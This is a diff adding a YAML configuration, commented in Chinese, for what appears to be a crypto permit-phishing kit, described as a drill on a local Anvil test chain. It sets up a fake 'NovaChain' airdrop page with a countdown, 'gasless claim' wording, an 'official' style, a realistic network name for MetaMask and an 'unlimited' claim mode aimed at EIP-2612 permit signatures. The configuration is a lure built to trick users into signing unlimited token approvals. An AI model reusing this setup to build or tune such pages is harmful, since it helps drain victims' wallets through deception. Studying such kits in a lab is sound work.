@@ -1,0 +1,24 @@
+# 目标档案:Anvil 本地演练基线(私有测试链,PhishingToken 含标准 EIP-2612 permit)
+# 实测方式:见 docs,DOMAIN_SEPARATOR 反推 + eth_call 签名试证
+chain:
+  rpc: "http://127.0.0.1:8546"   # Anvil
+  chain_id: 31337
+  rpc_name: "NovaChain Mainnet"  # MetaMask 里显示的网络名(拟真,可任意)
+
+token:
+  address: "0x8464135c8F25Da09e49BC8782676a84730C318bC"
+  name: "PhishingToken"          # ⚠ 必须与合约 permit 的 EIP-712 domain.name 一字不差
+  symbol: "AIRDROP"
+  permit_version: "1"
+  permit_order: "deadline_first" # 标准 EIP-2612 顺序
+
+site:
+  project: "星穹协议 NovaChain"
+  tagline: "下一代模块化 Layer2,主网空投第 3 期开启"
+  airdrop_amount: "1000"
+  countdown_minutes: 47
+  deadline: 1893456000
+  gasless_text: "免 Gas 领取(由 NovaChain 赞助商代付)"
+  claim_mode: "unlimited"
+  show_gasless: true
+  style: "official"
